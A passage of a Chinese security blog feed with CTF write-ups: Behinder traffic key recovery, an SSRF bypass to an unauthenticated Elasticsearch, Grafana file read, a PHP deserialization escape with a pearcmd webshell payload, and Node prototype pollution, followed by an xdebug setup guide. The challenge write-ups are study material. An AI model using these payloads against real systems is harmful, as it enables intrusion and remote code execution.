new.write(bytes.fromhex(flag.read()))
f.close()
flag.close()
new.close()
</code></pre>
<p>最终得到Miku.png这张图片，不难发现这个图片和之前压缩包里的图片大小一样，CRC一样，也就是说可以进行明文爆破</p>
<p>爆破后，得到的是一个前端小游戏，在SceneManager.js中找到一个key</p>
<p>sWxSAnweQIES46L</p>
<p>然后还有数据库的原始文件，可以放到mysql的data路径下，然后起mysql服务，用navicat连上就能看到一段base64，解码后是一个pk文件头，直接保存zip文件</p>
<p>用刚刚的key解压，得到另一端密文</p>
<pre><code>~呜嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~~~嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷嗷呜嗷呜呜啊~啊~啊嗷啊呜嗷嗷~啊~嗷~呜呜呜啊呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~啊啊嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊啊啊~啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊呜啊呜啊嗷啊呜~啊呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜~~嗷呜嗷呜呜~呜嗷呜啊嗷啊呜~啊啊嗷~嗷~呜呜呜呜啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊~啊~啊嗷啊呜~~嗷呜~嗷~呜呜嗷~嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜嗷嗷呜啊~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜~~呜呜嗷呜呜~嗷嗷呜啊嗷啊呜嗷嗷~啊~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊~~啊啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜~~呜嗷~嗷~呜呜呜呜~嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷呜嗷啊嗷啊呜~~嗷嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊啊啊~啊嗷啊呜~~嗷呜~嗷~呜呜嗷~嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷呜嗷啊嗷啊呜~啊啊嗷~嗷~呜呜呜啊呜嗷嗷嗷呜呜啊嗷嗷呜嗷呜呜啊啊啊~啊嗷啊呜嗷嗷~啊~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~~嗷嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜~~呜呜嗷呜呜啊啊啊嗷啊嗷啊呜~呜啊嗷~嗷~呜嗷呜~嗷啊
</code></pre>
<p>兽音译者解码得到flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[b站1024安全攻防挑战赛]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/b-zhan-1024-an-quan-gong-fang-tiao-zhan-sai/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/b-zhan-1024-an-quan-gong-fang-tiao-zhan-sai/">
        </link>
        <updated>2022-11-08T06:34:45.000Z</updated>
        <summary type="html"><![CDATA[<p>第一次参加b站的1024挑战赛，前几天都摸了，最后几天被队友拉着强行上号，没想到最后ak了！！（只能说趟的很舒服）<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1667889766807.png" alt="" loading="lazy"></p>
]]></summary>
        <content type="html"><![CDATA[<p>第一次参加b站的1024挑战赛，前几天都摸了，最后几天被队友拉着强行上号，没想到最后ak了！！（只能说趟的很舒服）<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1667889766807.png" alt="" loading="lazy"></p>
<!-- more -->
<h2 id="题目三">题目三</h2>
<p>流量题，很明显是在和behind.php做交互，也就是一个后门文件</p>
<p>传输的数据都进行了加密，这里payload 熵很大，Content-type 还是 appliacation/x-www-form-urlencoded，很有可能是冰蝎流量</p>
<p>但是，所有的流量中并没有发现key，如果是AES加密的，是无法解的，所有大概率是用了XOR加密</p>
<p>检测以及计算key值</p>
<pre><code class="language-python">from base64 import b64decode

phrases = [
    &quot;assert|eval(base64_decode('&quot;.encode(),
    b'&lt;?\n@error_reporting(0);\n\nfunctio',
    b'&lt;?\nfunction main($action, $remot',
    b'&lt;?\n@error_reporting(0);\nset_time',
    b'\nerror_reporting(0);\n\nfunction m',
    b'&lt;?\n@error_reporting(0);\n\n\nfuncti',
    b'&lt;?\nerror_reporting(0);\nfunction ',
    b'@error_reporting(0);\nfunction ma',
    b'&lt;?php\n\n$taskResult = array();\n$p',
    b&quot;&lt;?\nerror_reporting(0);\nheader('C&quot;,
    b'@error_reporting(0);\n\nfunction g',
    b'&lt;?\n@error_reporting(0);\n@set_tim',
  	b'@error_reporting',
]


def xor(l0, l1):
    ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a, b in zip(l0, l1)]
    return &quot;&quot;.join(ret)


def check(cipher):
    cipher = b64decode(cipher)
    for phrase in phrases:
        p0 = phrase[0:16]
        print(p0)
        p1 = phrase[16:]

        c0 = cipher[0:16]
        print(c0)
        c1 = cipher[16:16 + len(p1)]

        k0 = xor(p0, c0)
        print(k0)
        k1 = xor(p1, c1)
        # print(k1)

        if k1 in k0:
            return k0
    return None


cipher = &quot;...&quot;

key = check(cipher)
if key:
    print(&quot;[+]&quot;, cipher[:32], &quot;is XOR Behinder Request!&quot;)
    print(&quot;[+] The Key of Behinder is &quot;, key)
else:
    print(&quot;[-]&quot;, cipher[:32], &quot;not Behinder Request..&quot;)
</code></pre>
<p>将密文与几个常见的特征头比对<br>
拿到key=flag3{Beh1_nder}<br>
用key可以解码加密数据得到传输的明文</p>
<p>exp:</p>
<pre><code class="language-python">from base64 import b64decode
def xor(l0, l1):
    ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a, b in zip(l0, l1)]
    return &quot;&quot;.join(ret)
cipher = &quot;...&quot;
cipher = b64decode(cipher)
k0 = b'flag3{Beh1_nder}'
ans = &quot;&quot;
for i in range(100):
    c0 = cipher[16*i:16*(i+1)]
    p0 = xor(k0, c0)
    ans += p0
    print(p0)
print(ans)
</code></pre>
<h2 id="题目五">题目五</h2>
<p>进入网站后有一个msg的提示</p>
<pre><code>/etc/server.go
</code></pre>
<p>用fscan扫一下端口</p>
<pre><code>[*] WebTitle:http://101.132.189.74     code:404 len:18     title:None
[*] WebTitle:http://101.132.189.74:8082 code:200 len:3024   title:JFrog
[*] WebTitle:http://101.132.189.74:8081 code:200 len:878    title:None
[*] WebTitle:http://101.132.189.74:8088 code:302 len:29     title:None 跳转url: http://101.132.189.74:8088/login
[*] WebTitle:http://101.132.189.74:8088/login code:200 len:27707  title:Grafana
[+] InfoScan:http://101.132.189.74:8088/login [editor]
</code></pre>
<p>发现在8088端口有一个Grafana以及在8082端口有一个JFrog</p>
<p>Grafana 8.0.0 - 8.3.0存在任意文件读取漏洞（CVE-2021-43798）</p>
<p>所以可以尝试读取一下文件，成功读取到题目提示的server.go文件</p>
<pre><code class="language-go">package server

import (
	&quot;fmt&quot;
	&quot;github.com/andelf/go-curl&quot;
	&quot;github.com/gin-gonic/gin&quot;
	&quot;io&quot;
	&quot;net&quot;
	&quot;net/http&quot;
	&quot;net/url&quot;
	&quot;os&quot;
	&quot;strings&quot;
	&quot;crack5/utils/try&quot;
)


/*func Test(buf []byte, userdata interface{}) bool {
	println(&quot;DEBUG: size=&gt;&quot;, len(buf))
	println(&quot;DEBUG: content=&gt;&quot;, string(buf))
	return true
}*/

func SecCheck(myurl string) bool {
	if strings.Contains(myurl, &quot;@&quot;) || strings.Contains(myurl, &quot;./&quot;) {    //黑名单
		return false
	} else {
		return true
	}
}

func IsInternalIp(host string) bool {
	ipaddr, err := net.ResolveIPAddr(&quot;ip&quot;, host)  //根据域名查ip

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(ipaddr.IP, ipaddr.Zone)

	if ipaddr.IP.IsLoopback() { // 判断是否是还回地址 127.0.0.1
		return true
	}

	ip4 := ipaddr.IP.To4() //转换为ipv4
	if ip4 == nil {
		return false
	}
	return ip4[0] == 10 ||
		(ip4[0] == 172 &amp;&amp; ip4[1] &gt;= 16 &amp;&amp; ip4[1] &lt;= 31) ||
		(ip4[0] == 169 &amp;&amp; ip4[1] == 254) ||
		(ip4[0] == 192 &amp;&amp; ip4[1] == 168)
}

// 解决跨域问题
func Cors() gin.HandlerFunc {
	return func(c *gin.Context) {
		method := c.Request.Method

		c.Header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
		c.Header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type,AccessToken,X-CSRF-Token, Authorization, Token&quot;)
		c.Header(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, GET, OPTIONS&quot;)
		c.Header(&quot;Access-Control-Expose-Headers&quot;, &quot;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type&quot;)
		c.Header(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;)
		if method == &quot;OPTIONS&quot; {
			c.AbortWithStatus(http.StatusNoContent)
		}
		c.Next()
	}
}


// GetData
func GetData(c *gin.Context) {

	try.Try(func(){
		target, status := c.GetQuery(&quot;t&quot;)  //传参t

		if !status {
			c.JSON(http.StatusOK, gin.H{
				&quot;msg&quot;:&quot;query invalid&quot;,
			})
			return
		}
		if len(target) &gt;= 128 || !SecCheck(target) {  //长度限制，黑名单限制
			c.JSON(http.StatusBadRequest, gin.H{
				&quot;msg&quot;:&quot;illage url&quot;,
			})
			return
		}

		u, err := url.Parse(target)  //解析

		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{   //解析错误
				&quot;msg&quot;:&quot;illage url&quot;,
			})
			return
		} else {
			if (u.Scheme != &quot;http&quot; &amp;&amp; u.Scheme != &quot;https&quot;) || IsInternalIp(u.Hostname()) {  //只接受http和https协议 ip检测
				c.JSON(http.StatusBadRequest, gin.H{
					&quot;msg&quot;:&quot;illage url&quot;,
				})
				return
			}

			easy := curl.EasyInit()
			defer easy.Cleanup()
			easy.Setopt(curl.OPT_URL, target)
			easy.Setopt(curl.OPT_TIMEOUT, 3)
			easy.Setopt(curl.OPT_FOLLOWLOCATION, false)
			easy.Setopt(curl.OPT_WRITEFUNCTION, func (buf []byte, extra interface{}) bool {
				c.Data(http.StatusOK, &quot;text/html&quot;, buf)
				return true
			})
			err := easy.Perform()
			if err != nil {
				fmt.Printf(&quot;ERROR: %v\n&quot;, err)
				return
			} else {
				c.JSON(http.StatusInternalServerError, nil)
				return
			}
		}
	}).Catch(func() {
		c.JSON(http.StatusBadGateway, nil)
		return
	})

}

func Info(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		&quot;msg&quot;:&quot; /etc/server.go&quot;,
	})
	return
}


//
func LoadUrl(r *gin.Engine) {

	r.Use(Cors())
	r.GET(&quot;/get&quot;, GetData)
	r.GET(&quot;/index&quot;, Info)
}


func RunAdmin() http.Handler {
	gin.DisableConsoleColor()

	f, _ := os.Create(&quot;./logs/server.log&quot;)
	gin.DefaultWriter = io.MultiWriter(f)


	r := gin.Default()

	r.Use(gin.LoggerWithFormatter(func(param gin.LogFormatterParams) string {
		return fmt.Sprintf(&quot;[Crack5-Web] %s - [%s] \&quot;%s %s %s %d %s \&quot;%s\&quot; %s\&quot;\n&quot;,
			param.ClientIP,
			param.TimeStamp.Format(&quot;2006-01-02 15:04:05&quot;),
			param.Method,
			param.Path,
			param.Request.Proto,
			param.StatusCode,
			param.Latency,
			param.Request.UserAgent(),
			param.ErrorMessage,
		)
	}))
	r.Use(gin.Recovery())

	LoadUrl(r)

	return r
}
</code></pre>
<p>在get路由下传参t，并解析，curl发起一个对话</p>
<p>也就是说，填入一个url后，该网站可以实现跨站访问，看一下里面的两个waf</p>
<pre><code class="language-go">if (u.Scheme != &quot;http&quot; &amp;&amp; u.Scheme != &quot;https&quot;) || IsInternalIp(u.Hostname()) {  //只接受http和https协议 ip检测
				c.JSON(http.StatusBadRequest, gin.H{
					&quot;msg&quot;:&quot;illage url&quot;,
				})
				return
</code></pre>
<p>以及</p>
<pre><code class="language-go">func IsInternalIp(host string) bool {
	ipaddr, err := net.ResolveIPAddr(&quot;ip&quot;, host)  //根据域名查ip

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(ipaddr.IP, ipaddr.Zone)

	if ipaddr.IP.IsLoopback() { // 判断是否是还回地址
		return true
	}

	ip4 := ipaddr.IP.To4() //转换为ipv4
	if ip4 == nil {
		return false
	}
	return ip4[0] == 10 ||
		(ip4[0] == 172 &amp;&amp; ip4[1] &gt;= 16 &amp;&amp; ip4[1] &lt;= 31) ||
		(ip4[0] == 169 &amp;&amp; ip4[1] == 254) ||
		(ip4[0] == 192 &amp;&amp; ip4[1] == 168)
}
</code></pre>
<p>必须是http或者https开头，地址的ip不能是还回地址，也就是127.0.0.1，然后对整个ipv4也做了一些限制</p>
<p>由于这里存在ResolveIPAddr()方法，输入的域名会被解析，所以短ip的方式也难以绕过，十进制等ip转换也会被解码</p>
<p>但是这是有一个绝佳方案</p>
<pre><code>http://0.0.0.0
</code></pre>
<p>指代本机的所有ip，自然也包括127.0.0.1</p>
<p>我们的目的是根据已有提示去打9200端口</p>
<pre><code>{
  &quot;name&quot; : &quot;ali-sh-sec-ctf-25aaa86-01&quot;,
  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
  &quot;cluster_uuid&quot; : &quot;ikcj8ysFR2KnnTa5chqvUA&quot;,
  &quot;version&quot; : {
    &quot;number&quot; : &quot;7.17.6&quot;,
    &quot;build_flavor&quot; : &quot;default&quot;,
    &quot;build_type&quot; : &quot;deb&quot;,
    &quot;build_hash&quot; : &quot;f65e9d338dc1d07b642e14a27f338990148ee5b6&quot;,
    &quot;build_date&quot; : &quot;2022-08-23T11:08:48.893373482Z&quot;,
    &quot;build_snapshot&quot; : false,
    &quot;lucene_version&quot; : &quot;8.11.1&quot;,
    &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;,
    &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot;
  },
  &quot;tagline&quot; : &quot;You Know, for Search&quot;
}
</code></pre>
<p>发现是一个elasticsearch的未授权访问</p>
<p>直接查询所有的index和type</p>
<pre><code>_search?pretty=true 
</code></pre>
<p>得到用户名和密码</p>
<pre><code>&quot;hits&quot; : {
    &quot;total&quot; : {
      &quot;value&quot; : 1,
      &quot;relation&quot; : &quot;eq&quot;
    },
    &quot;max_score&quot; : 1.0,
    &quot;hits&quot; : [
      {
        &quot;_index&quot; : &quot;bilibili-1024&quot;,
        &quot;_type&quot; : &quot;_doc&quot;,
        &quot;_id&quot; : &quot;2eSE84MBoy7sRgaelu2S&quot;,
        &quot;_score&quot; : 1.0,
        &quot;_source&quot; : {
          &quot;username&quot; : &quot;ctfer&quot;,
          &quot;passwd&quot; : &quot;1qaz@WSX&quot;,
          &quot;ttl&quot; : &quot;false&quot;,
          &quot;msg&quot; : &quot;good luck ctfer&quot;
        }
      }
</code></pre>
<p>登入JFrog后台，在后台直接搜ssh，就能找到连接ssh的用户名和密码，连接后cat flag即可</p>
<h3 id="关于elasticsearch">关于elasticsearch</h3>
<p><a href="https://blog.51cto.com/feelmanc/1250430">elasticsearch的基本用法_feelManc的技术博客_51CTO博客</a></p>
<p><a href="https://so.csdn.net/so/search?q=Elasticsearch&amp;spm=1001.2101.3001.7020">Elasticsearch</a>是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记两道强网拟态的web]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/ji-liang-dao-qiang-wang-ni-tai-de-web/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/ji-liang-dao-qiang-wang-ni-tai-de-web/">
        </link>
        <updated>2022-11-08T06:27:08.000Z</updated>
        <summary type="html"><![CDATA[<p>没能挺进决赛，但是稳稳苟住了前60，所以问题不大🤣</p>
]]></summary>
        <content type="html"><![CDATA[<p>没能挺进决赛，但是稳稳苟住了前60，所以问题不大🤣</p>
<!-- more -->
<h2 id="ezus">ezus</h2>
<p>首先可以看到这一段源码</p>
<pre><code class="language-php">&lt;?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
{
    exit(&quot;no way!&quot;);
}
if (isset($_GET['source']))
{
    $path = basename($_SERVER['PHP_SELF']);
    if (!preg_match('/tm.php$/', $path) &amp;&amp; !preg_match('/index.php$/', $path))
    {
        exit(&quot;nonono!&quot;);
    }
    highlight_file($path);
    exit();
}
?&gt;
&lt;a href=&quot;index.php?source&quot;&gt;source&lt;/a&gt;
</code></pre>
<p>直接绕过就行</p>
<pre><code>http://172.52.4.193/index.php/tm.php/�?source
</code></pre>
<p>得到tm.php源码</p>
<pre><code class="language-php">&lt;?php
class UserAccount
{
    protected $username;
    protected $password;
 
    public function __construct($username, $password)
    {
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}
 
function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}
 
function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;
    
    public function __construct($hint, $f)
    {
        $this-&gt;f = $f;
        $this-&gt;hint = $hint;
    }
    
    public function __wakeup()
    {
        //something in hint.php
        if ($this-&gt;hint != &quot;pass&quot; || $this-&gt;f != &quot;pass&quot;) {
            $this-&gt;hint = &quot;pass&quot;;
            $this-&gt;f = &quot;pass&quot;;
        }
    }
    
    public function __destruct()
    {
        if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this-&gt;hint);
            if (!empty($this-&gt;f)) {
                if (strpos($this-&gt;f, &quot;try&quot;) !==  false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) {
                    @include($this-&gt;f . '.php');
                } else {
                    die(&quot;try again!&quot;);
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this-&gt;hint);
                    echo &quot;&lt;br/&gt;&quot;.$out;
                } else {
                    die(&quot;&lt;br/&gt;error&quot;);
                }
            } else {
                die(&quot;try it!&quot;);
            }
        }
        else
        {
            echo &quot;Invalid URL&quot;;
        }
    }
}

$username = $_POST['username'];
$password = $_POST['password'];

$user = serialize(new UserAccount($username, $password));
unserialize(object_weakup(object_sleep($user)))
?&gt; 
</code></pre>
<p>存在反序列化的逃逸，目的是用UserAccount类去触发order类，也就是逃逸双引号，<br>
让password=new order()</p>
<p>payload：</p>
<pre><code>username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Ftrypass%2Fread%3Dconvert.base64-encode%2Fresource%3Dhint%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>读一下hint.php</p>
<pre><code class="language-php">&lt;?php
echo &quot;This is the wrong way&quot;;
$flag = &quot;you can find it in /f1111444449999.txt&quot;;
?&gt;
</code></pre>
<p>尝试一下pearcmd，发现还真有，那么就可以直接写马了</p>
<p>payload：</p>
<pre><code>POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[1])?&gt;+3.php

username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A60%3A%22trypass%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>getshell后读flag</p>
<pre><code>(www-data:/var/www/html) $ cat /f1111444449999.txt
flag{sMGbQqN7RTQwS6L0j9f5nytW1wWBAkWJ}
</code></pre>
<h2 id="whoyouare">WHOYOUARE</h2>
<p>题目采用了fastify框架，主要的代码在user.js中</p>
<pre><code class="language-javascript">const merge = require('../utils/merge')
const bin = &quot;/bin/bash&quot;
const ChildProcess = require('child_process');

function checkUser(command){
    if (Array.isArray(command) === false || command.length &gt; 2) {  //数组且长度小于等于2
        return false;
    }
    for (let i = 0; i &lt; command.length; i++) {
        let cmd = command[i];
        if (typeof cmd !== 'string' || cmd.length &gt; 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) { //小于等于4的字符串
            return false;
        }
    }
    return true;
}

async function routes (fastify, options) {
    fastify.route(
        {
            method: 'POST',
            url: '/user',
            schema: {
                querystring: {
                    user: { type: 'string' },
                },
                additionalProperties: false,
                response: {
                    200: {
                        $ref: 'respWrapper#/response/success'
                    }
                }
            },
            preHandler: function (request, reply, done) {
                //user init
                request.user = {username : 'guest', command: [&quot;-c&quot;, &quot;id&quot;]}  //污染的目标
                let user = JSON.parse(request.body.user)  //json里的user
                // clean user command
                if (checkUser(user.command) !== true) {   //cmd需要满足条件
                    user.command = [&quot;-c&quot;, &quot;id&quot;]
                }
                try {
                    merge(request.user, user)
                }catch (e){
                    reply.code(400).send({status: 1, info: &quot;Something error&quot;})
                    return ;
                }
                done()
            },
            handler : function (request, reply) {
                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) =&gt; {   //命令执行
                    if (error) {
                        reply.code(400).send({status: 1, info: error})
                    }
                    reply.code(200).send({ status : 0 , info : `User of ${request.user.username} : ${stdout}`});
                });
            }
        })
    fastify.route({
        method: 'GET',
        url: '/',
        response: {
            $ref: 'respWrapper#/response/success'
        },
        handler: function (request, reply) {
            reply.send({ status: 0, info: 'go user' })
        }
    })
}

module.exports = routes
</code></pre>
<p>首先是两个路由，GET访问则会提示我们去访问user</p>
<p>接下来就是POST访问/user，可以看到它会接受json数据，但我们发现只有requset.user中的cmd才会被执行，所以我们的目的就是想办法污染request.user对象，我们可控的是user对象，以及里面的command属性</p>
<p>与此同时，这两个对象还有一个merge函数相连，这就为原型链污染创造了机会</p>
<pre><code>{&quot;user&quot;:{&quot;__proto__&quot;:{&quot;command&quot;:[&quot;-c&quot;, &quot;cat /flag&quot;]}}}
</code></pre>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888886359.png" alt="" loading="lazy"><br>
但是非常遗憾的是<code>__proto___</code>被过滤了，但是constructor以及prototype都没有被过滤，由于merge的递归功能，我们可以用constructor.prototype去指向user的原型</p>
<pre><code>{&quot;user&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;1&quot;,&quot;cat /flag&quot;}，&quot;command&quot;:[&quot;-c&quot;],}}}
</code></pre>
<p>这个json被递归后，Object对象中会被写入属性</p>
<pre><code>&quot;1&quot;:&quot;cat /flag&quot;
</code></pre>
<p>在合并command属性时，由于user中的command数组只有一个值，而request.user中的command数组有两个值，所以递归过程中会出现(source是user，target是request.user)</p>
<pre><code class="language-javascript">const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const merge = (target, source) =&gt; {
    for (const key in source) {
        if(!whileTypes.includes(typeof source[key]) &amp;&amp; !whileTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                merge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}
</code></pre>
<p>source[1]不存在而target[1]=id，于是乎就会自动从原型中寻找是否有合适的值，对于数组来说，</p>
<p><code>&quot;1&quot;:&quot;cat /flag&quot;</code>就是array[1]=&quot;cat /flag&quot;</p>
<p>于是source就从它的原型中继承了这个键值对，</p>
<p>然后target[key] = source[key] 就把id篡改成了cat /flag</p>
<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888849256.png" alt="" loading="lazy"></figure>
<p>final payload：</p>
<pre><code>{&quot;user&quot;:\&quot;constructor\&quot;:{\&quot;prototype\&quot;: {\&quot;1\&quot;: \&quot;cat /flag\&quot;,&quot;{\&quot;command\&quot;:[\&quot;-c\&quot;]}}}&quot;}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vscode+phpstudy动态调试环境]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/">
        </link>
        <updated>2022-10-19T08:56:37.000Z</updated>
        <summary type="html"><![CDATA[<p>小白的cnvd之旅（一）：搭建环境</p>
]]></summary>
        <content type="html"><![CDATA[<p>小白的cnvd之旅（一）：搭建环境</p>
<!-- more -->
<h2 id="准备工作">准备工作</h2>
<p>phpstudy（直接官网下载就可以）<br>
<a href="https://www.xp.cn/download.html">Windows版phpstudy下载 - 小皮面板(phpstudy) (xp.cn)</a><br>
vscode（同样官网直接下）<br>
https://code.visualstudio.com/</p>
<h2 id="搭建">搭建</h2>
<h4 id="第一步">第一步</h4>
<p>打开vscode，先安装一下一些必要的插件<br>
1.PHP Debug<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169822931.png" alt="" loading="lazy"><br>
2.汉化包<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169831114.png" alt="" loading="lazy"><br>
3.Code Runner<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169834739.png" alt="" loading="lazy"></p>
<h4 id="第二步">第二步</h4>
<p>安装好后打开phpstudy，找到php所在的路径<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169847282.png" alt="" loading="lazy"><br>
将路径复制，写到系统的环境变量中，具体操作：<br>
打开高级系统设置-&gt;环境变量-&gt;Path-&gt;新建<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169855325.png" alt="" loading="lazy"><br>
配好后可以在cmd中输入</p>
<pre><code>php -v
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1666169870770.png" alt="" loading="lazy"></figure>
<h4 id="第三步">第三步</h4>
<p>下载xdebug<br>
先新建一个index.php,得到phpinfo的内容<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169909555.png" alt="" loading="lazy"><br>
然后去https://xdebug.org/wizard，把phpinfo中的内容粘贴进去，可以得到适合的xdebug版本<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169992678.png" alt="" loading="lazy"><br>
按照它的提示一步一步做：<br>
将下载好的xdebug放到对应的目录下，并重命名<br>
然后在php.ini的最下面写入相对应的配置，当然这并不是完整的[Xdebug]配置<br>
还有一部分在vscode的PHPdebug中，如果装的是Xdebug3，则复制上面部分，Xdebug2则复制下面部分，这里主要是因为Xdebug从2版本到3版本做了一些替换<br>
具体参照https://xdebug.org/docs/upgrade_guide</p>
<p>以Xdebug3为例：<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170031758.png" alt="" loading="lazy"></p>
<p>配置好后保存php.ini，并重启phpstudy的服务<br>
打开phpinfo，搜索Xdebug，如果能看到Xdebug的标志，则说明到目前为止一切顺利<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170105239.png" alt="" loading="lazy"></p>
<h4 id="第四步">第四步</h4>
<p>用vscode打开一个文件夹，按F5进入调试，它会让我们创建一个launch.json,这里默认即可<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170118714.png" alt="" loading="lazy"><br>
然后下一个断点，用浏览器访问你的php文件，最终success。（Ohhhhhhhhhh<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170134978.png" alt="" loading="lazy"></p>
<h2 id="解决报错">解决报错</h2>
<h4 id="问题一">问题一</h4>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1666170145850.png" alt="" loading="lazy"><br>
出现如上报错，说明第三步从php debug中复制配置所对应的版本错了，如上就是Xdebug3却复制了Xdebug2的配置</p>
<h4 id="问题二">问题二</h4>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1666170155427.png" alt="" loading="lazy"><br>
这个问题主要因为Xdebug3中的 xdebug.start_with_request = yes 将 Xdebug 配置为在每个请求上建立连接，同时，官方文档提供使用 xdebug.start_with_request = trigger 以便仅在明确指出需要时连接 Xdebug。在这种情况下，我们可以通过 GET 参数传递一个额外的密钥来开始逐步调试过程，例如 http://localhost/?XDEBUG_TRIGGER=1，但很不方便。<br>
解决方法就是在php.ini的配置中加入</p>
<pre><code>xdebug.discover_client_host = yes
xdebug.log_level = 0
</code></pre>
<h4 id="问题三">问题三</h4>
<p>端口被占用，这种情况建议在使用这个端口（默认是9000-9003）之前可以在phpstudy中检查一下端口是否已经被占用<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170170363.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[全新的开始]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/quan-xin-de-kai-shi/</id>
